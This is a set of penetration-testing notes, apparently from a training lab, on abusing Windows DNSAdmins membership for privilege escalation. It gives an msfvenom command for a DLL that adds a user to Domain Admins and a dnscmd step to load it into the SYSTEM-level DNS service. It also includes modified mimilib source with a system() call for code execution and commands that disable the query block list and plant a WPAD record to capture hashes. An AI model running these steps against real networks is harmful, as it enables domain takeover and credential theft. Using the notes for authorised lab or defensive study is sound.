This group membership itself "theoretically" let's you administer the DNS service on a Windows Machine.
But since DNS runs as a top Admin user "NT AUTHORITY\SYSTEM" this can be dangerous and can potentially leads to RCE or other fun stuff.
This is done by using **ServerLevelPluginDll** allows us to load a custom DLL with zero verification of the DLL's path. 

## How to attack it
1)Check that your user is part of **DNSAdmins** group if not then you have to add it
2)Prepare the payload in dll format (This will add a domain user to **DNSADMIN** group membership)
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
3)Transfer the file to the victim
4)Load the payload into DNS service (MUST be part of DNSADMINS otherwise will fail! use ABSOLUTE PATHS)
```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
5)Restart the DNS service or wait the reboot of the **serverlevelplugindll**
6)When done so, it will execute the code of the DLL. You can also inject a Revshell if you like!

## How to Cleanup
1)Check if **ServerLevelPluginDll** exist
```
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
2)Delete the **ServerLevelPluginDll** link to our malicious dll
```
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```
3)Start DNS
```
sc start dns
```
4)Check Status of DNS
```
sc query dns
```


## RCE via Mimilib.dll
You can gain RCE via Mimilib.dll: https://github.com/gentilkiwi/mimikatz/tree/master/mimilib
Edit  **kdns.c** to inject a RCE:
```

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```


## Sniff hashes via WPAD
If you are part of DNSAdmin you can edit the WPAD in the Dns and redirect all victims request to your listening Responder.
1)Disabling the Global Query Block List
```
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
2)Add a new WPAD pointing to your IP
```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address YOURIP
```
